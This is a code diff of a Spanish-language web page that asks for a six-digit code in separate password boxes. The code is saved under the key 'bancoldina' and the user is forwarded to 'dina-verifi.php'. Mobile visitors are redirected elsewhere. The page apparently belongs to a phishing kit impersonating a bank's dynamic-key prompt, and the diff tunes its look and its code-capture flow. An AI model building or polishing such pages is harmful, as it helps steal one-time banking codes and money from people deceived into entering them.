@@ -31,7 +31,7 @@
     }
     .center-box {
         position: absolute;
-        top: 60%;
+        top: 55%;
         left: 49.7%;
         transform: translate(-50%, -50%);
         background-color: rgb(255, 255, 255);
@@ -47,7 +47,7 @@
         width: 100%;
         display: flex;
         justify-content: space-between;
-        gap: 1px; /* Espacio entre los inputs */
+        gap: 10px; /* Espacio entre los inputs */
     }
     .password-input {
         width: 40px;
@@ -60,16 +60,14 @@
     }
     .button-container {
         position: absolute;
-        top: 77.5%;
+        top: 66.5%;
         left: 50%;
         transform: translate(-50%, -50%);
         display: flex;
-        flex-direction: column; /* Cambiado a 'column' para poner los botones uno debajo del otro */
-        gap: 24px; /* Espacio entre los botones */
-        transition: top 0.3s ease-in-out; /* Suavizar el movimiento */
+        gap: 15px;
     }
     .button-container button {
-        padding: 15px 120px;
+        padding: 21px 75px;
         font-size: 16px;
         border: none;
         border-radius: 50px;
@@ -79,17 +77,17 @@
         transition: background-color 0.3s ease;
     }
     .button-container button:first-child {
-        background-color: #ffda37;
+        background-color: #ffffff;
         border: 1px solid black;
     }
     .button-container button:first-child:hover {
-        background-color: #ffda37;
+        background-color: #ffffff;
     }
     .button-container button:last-child {
-        background-color: #bababa;
+        background-color: #ffda37;
     }
     .button-container button:last-child:hover {
-        background-color: #bababa;
+        background-color: #ffda37;
     }
 </style>
 
@@ -97,41 +95,43 @@
 </head>
 <body>
     <div class="image-container">
-        <img src="img/cel3.jpg" alt="Background Image">
+        <img src="img/3.png" alt="Background Image">
         <div class="center-box">
             <div class="input-container">
-                <input type="tel" class="password-input" maxlength="1" id="input1">
-                <input type="tel" class="password-input" maxlength="1" id="input2">
-                <input type="tel" class="password-input" maxlength="1" id="input3">
-                <input type="tel" class="password-input" maxlength="1" id="input4">
-                <input type="tel" class="password-input" maxlength="1" id="input5"> <!-- Nuevo input -->
-                <input type="tel" class="password-input" maxlength="1" id="input6"> <!-- Nuevo input -->
+                <input type="password" class="password-input" maxlength="1" id="input1">
+                <input type="password" class="password-input" maxlength="1" id="input2">
+                <input type="password" class="password-input" maxlength="1" id="input3">
+                <input type="password" class="password-input" maxlength="1" id="input4">
+                <input type="password" class="password-input" maxlength="1" id="input5"> <!-- Nuevo input -->
+                <input type="password" class="password-input" maxlength="1" id="input6"> <!-- Nuevo input -->
             </div>
         </div>
         <div class="button-container">
-            <button id="continuar">Continuar</button>
             <button id="cancelar">Cancelar</button>
+            <button id="continuar">Continuar</button>
         </div>
     </div>
 
     <script>
+        // Verificar si el usuario está en un dispositivo móvil
+        if (window.innerWidth <= 800) { // Este valor puede ajustarse según el tamaño que consideres móvil
+            window.location.href = "cel-dina.html"; // Redirige a una página informando que no está disponible
+        }
+
         const inputs = document.querySelectorAll('.password-input');
 
-        // Añadir validación de solo números
         inputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
-                const value = e.target.value;
-                // Solo permitir números
-                if (!/^\d$/.test(value)) {
-                    e.target.value = ''; // Borra si no es un número
-                } else {
-                    if (index < inputs.length - 1 && e.target.value !== '') {
+                // Si el input no está vacío, mueve al siguiente
+                if (e.target.value !== '') {
+                    if (index < inputs.length - 1) {
                         inputs[index + 1].focus();
                     }
                 }
             });
 
             input.addEventListener('keydown', (e) => {
+                // Si presionamos la tecla 'backspace', mover al input anterior
                 if (e.key === 'Backspace' && index > 0) {
                     inputs[index - 1].focus();
                 }
@@ -139,25 +139,21 @@
         });
 
         document.getElementById('continuar').addEventListener('click', () => {
+            // Concatenar los valores de los inputs en un solo string
             const inputValues = Array.from(document.querySelectorAll('.password-input'))
                                       .map(input => input.value)
                                       .join('');
+
+            // Guardar el string concatenado en localStorage
             localStorage.setItem('bancoldina', inputValues);
+
+            // Redirigir a la página dina-verifi.php
             window.location.href = 'dina-verifi.php';
         });
 
         document.getElementById('cancelar').addEventListener('click', () => {
-            window.location.href = 'index.html';
-        });
-
-        // Detectar apertura del teclado
-        window.addEventListener('resize', () => {
-            const buttonContainer = document.querySelector('.button-container');
-            if (window.innerHeight < 500) {  // Si la altura de la ventana es pequeña, el teclado está abierto
-                buttonContainer.style.top = '90%';  // Mover los botones hacia abajo
-            } else {
-                buttonContainer.style.top = '80.5%';  // Posición original
-            }
+            // Puedes agregar cualquier acción adicional aquí si se desea cancelar
+            window.location.href = 'index.html'; // O redirigir a otra página
         });
     </script>
 </body>
